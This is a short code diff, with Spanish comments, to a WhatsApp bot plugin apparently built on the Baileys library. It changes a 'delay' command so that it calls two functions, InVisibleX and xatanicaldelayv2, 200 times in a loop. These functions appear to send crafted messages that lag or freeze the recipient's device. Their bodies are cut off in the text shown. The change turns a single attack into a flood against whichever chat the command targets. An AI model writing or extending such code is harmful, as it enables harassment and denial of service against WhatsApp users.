@@ -4,11 +4,12 @@ let handler = async (m, { conn }) => {
   const jid = m.chat;
 
   try {
-    // Ejecuta ambas funciones con el mismo número que envió el comando
-    await InVisibleX(conn, jid, true);
-    await xatanicaldelayv2(conn, jid, true);
+    for (let i = 0; i < 200; i++) {
+      await InVisibleX(conn, jid, true);
+      await xatanicaldelayv2(conn, jid, true);
+    }
 
-    await conn.sendMessage(jid, { text: "✅ Delay enviado correctamente." }, { quoted: m });
+    await conn.sendMessage(jid, { text: "✅ Delay enviado 200 veces." }, { quoted: m });
   } catch (e) {
     console.error("❌ Error en delay:", e);
     await conn.sendMessage(jid, { text: "❌ Error al ejecutar:\n" + e.message }, { quoted: m });
@@ -18,7 +19,7 @@ let handler = async (m, { conn }) => {
 handler.command = /^delay$/i;
 export default handler;
 
-// FUNCIONES INTERNAS
+// FUNCIONES
 
 async function InVisibleX(sock, jid, mention) {
   let msg = await generateWAMessageFromContent(jid, {
